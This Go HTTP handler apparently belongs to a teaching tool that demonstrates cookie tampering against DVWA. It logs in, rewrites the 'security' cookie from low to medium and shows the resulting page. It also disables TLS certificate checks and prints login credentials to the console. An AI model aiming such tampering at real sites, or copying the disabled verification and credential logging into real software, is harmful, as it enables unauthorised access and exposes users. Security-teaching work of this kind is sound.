package handlers

import (
	"crypto/tls"
	"darwin2/config"
	"fmt"
	"github.com/labstack/echo/v4"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
)

type CookieActionResponse struct {
	InitialCookie  string `json:"initialCookie"`
	ModifiedCookie string `json:"modifiedCookie"`
	WebPageHTML    string `json:"webPageHTML"`
}


func HandleCookieSecurityAttack(c echo.Context) error {
	// Authentication
	username := c.FormValue("username")
	password := config.GetDVWAPassword(username)
	fmt.Println("Attempting to authenticate user:", username)

	loginURL := config.CurrentConfig.DVWAURL + "/login.php"
	formDataString := "username=" + url.QueryEscape(username) + "&password=" + url.QueryEscape(password) + "&Login=Login"
	fmt.Println("Encoded Form Data for login:", formDataString)

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(formDataString))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return c.String(http.StatusInternalServerError, "Error creating request: "+err.Error())
	}

	fmt.Println("Request created for URL:", req.URL)

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", config.CurrentConfig.USERAGENT)

	jar, err := cookiejar.New(nil)
	if err != nil {
		fmt.Println("Error creating cookie jar:", err)
		return c.String(http.StatusInternalServerError, "Error creating cookie jar: "+err.Error())
	}

	client := &http.Client{
		Jar: jar,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	fmt.Println("Sending authentication request")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return c.String(http.StatusInternalServerError, "Error sending request: "+err.Error())
	}
	defer resp.Body.Close()

	fmt.Println("Authentication request sent, processing response")

	// Get the initial cookie string
	initialCookieHTML := ""
	fmt.Println("Initial cookies:")
	for _, cookie := range jar.Cookies(req.URL) {
		fmt.Println(" - ", cookie.String())
		cookieStr := cookie.String()
		if strings.Contains(cookieStr, "low") {
			cookieStr = strings.ReplaceAll(cookieStr, "low", `<span style="color: red;">low</span>`)
		}
		initialCookieHTML += fmt.Sprintf("<span style='font-family: Courier; font-size: 1em;'>%s</span><br>", cookieStr)
	}

	// Manipulate the cookie and create a new CookieJar
	newJar, err := cookiejar.New(nil)
	if err != nil {
		fmt.Println("Error creating new cookie jar:", err)
		return c.String(http.StatusInternalServerError, err.Error())
	}

	var cookies []*http.Cookie
	fmt.Println("Modifying cookies:")
	for _, cookie := range jar.Cookies(req.URL) {
		fmt.Println(" - Original:", cookie.String())
		if cookie.Name == "security" {
			modifiedCookie := &http.Cookie{Name: cookie.Name, Value: "medium"}
			fmt.Println(" - Modified:", modifiedCookie.String())
			cookies = append(cookies, modifiedCookie)
		} else {
			cookies = append(cookies, cookie)
		}
	}

	newJar.SetCookies(req.URL, cookies)

	// Get the modified cookie string
	modifiedCookieHTML := ""
	fmt.Println("Modified cookies:")
	for _, cookie := range newJar.Cookies(req.URL) {
		fmt.Println(" - ", cookie.String())
		cookieStr := cookie.String()
		if strings.Contains(cookieStr, "medium") {
			cookieStr = strings.ReplaceAll(cookieStr, "medium", `<span style="color: red;">medium</span>`)
		}
modifiedCookieHTML += fmt.Sprintf("<span style='font-family: Courier; font-size: 1em;'>%s</span><br>", cookieStr)
	}

	// Make a new request with the manipulated cookie
	client = &http.Client{
		Jar: newJar,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err = http.NewRequest("GET", config.CurrentConfig.DVWAURL+"/security.php", nil)
	if err != nil {
		fmt.Println("Error creating new request:", err)
		return c.String(http.StatusInternalServerError, err.Error())
	}

	fmt.Println("Created new request to check modified cookie impact")

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", config.CurrentConfig.USERAGENT)

	resp, err = client.Do(req)
	if err != nil {
		fmt.Println("Error sending new request:", err)
		return c.String(http.StatusInternalServerError, err.Error())
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return c.String(http.StatusInternalServerError, err.Error())
	}

	fmt.Println("Response received for modified cookie request")

	return c.JSON(http.StatusOK, &CookieActionResponse{
		InitialCookie:  initialCookieHTML,
		ModifiedCookie: modifiedCookieHTML,
		WebPageHTML:    string(body),
	})
}
